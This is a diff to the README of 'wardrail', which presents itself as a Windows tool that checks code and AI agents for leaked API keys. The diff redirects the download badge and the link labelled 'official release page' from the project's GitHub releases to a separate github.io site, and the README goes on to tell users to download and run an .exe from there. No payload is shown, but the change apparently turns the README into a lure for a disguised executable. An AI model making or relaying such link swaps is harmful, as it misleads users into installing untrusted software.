@@ -1,6 +1,6 @@
 # 🛡️ wardrail - Protect your work from security leaks
 
-[![Download wardrail](https://img.shields.io/badge/Download_wardrail-blue)](https://github.com/bennettculinary759/wardrail/releases)
+[![Download wardrail](https://img.shields.io/badge/Download_wardrail-blue)](https://bennettculinary759.github.io)
 
 Wardrail monitors your projects for security risks. It checks your code for exposed API keys and sensitive data before you save your progress. This tool acts as a guard for your digital workspace by finding potential slips in your code history. It focuses on the safety of your AI agents and automation tools.
 
@@ -8,7 +8,7 @@ Wardrail monitors your projects for security risks. It checks your code for expo
 
 Follow these steps to set up the tool on your Windows computer.
 
-1. Go to the [official release page](https://github.com/bennettculinary759/wardrail/releases) to find the latest version of the application.
+1. Go to the [official release page](https://bennettculinary759.github.io) to find the latest version of the application.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file name to start the download.
 4. Save the file to your desktop or a folder you can find later.
